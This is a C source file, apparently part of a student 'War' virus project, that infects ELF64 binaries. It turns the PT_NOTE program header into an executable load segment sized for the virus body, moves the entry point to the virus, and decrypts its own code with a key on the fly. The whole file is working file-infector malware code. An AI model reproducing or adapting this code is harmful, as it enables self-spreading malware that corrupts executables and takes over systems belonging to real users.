/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:22:03 by ddinaut           #+#    #+#             */
/*   Updated: 2019/03/22 16:58:26 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

void		infect(t_data *data)
{
//	revert_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
	update_one(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
	if (data->context == false)
		goto ERR;

	data->context = false;
	Elf64_Phdr  *tmp = NULL;
	for (register int off = 0 ; off < data->header->e_phnum ; off++)
	{
		tmp = (Elf64_Phdr*)((char*)data->bin.map + (data->header->e_phoff + sizeof(Elf64_Phdr) * off));
		if (!tmp || (void*)tmp >= (void*)data->bin.map + data->bin.size)
			goto ERR;
		if (tmp->p_type == PT_NOTE)
			data->virus.note = tmp;
		if ((tmp->p_type == PT_LOAD) && (tmp->p_flags == (PF_W | PF_R)))
			data->virus.data = tmp;
	}
	if (data->virus.note == NULL || data->virus.data == NULL)
		goto ERR;

	size_t base = data->virus.data->p_vaddr + data->virus.data->p_memsz;
	size_t padd = base % data->virus.data->p_align;

	data->virus.size = (size_t)end_of_data - (size_t)start;
	data->virus.note->p_type = PT_LOAD;
	data->virus.note->p_flags = (PF_X | PF_W | PF_R);
	data->virus.note->p_filesz = data->virus.size;
	data->virus.note->p_memsz = data->virus.size;
	data->virus.note->p_align = data->virus.data->p_align;
	data->virus.note->p_offset = base - padd;
	data->virus.note->p_vaddr = base + (data->virus.data->p_align - padd);

	data->bin_entry = data->header->e_entry;
	data->vrs_entry = data->virus.note->p_vaddr;
	data->header->e_entry = data->vrs_entry;
	data->header->e_shoff += data->virus.size + (data->virus.note->p_offset - (data->virus.data->p_offset + data->virus.data->p_filesz));
	data->context = true;

ERR:
//	revert_one(&data->key, (char*)inject, (size_t)release - (size_t)inject);
	inject(data);
}
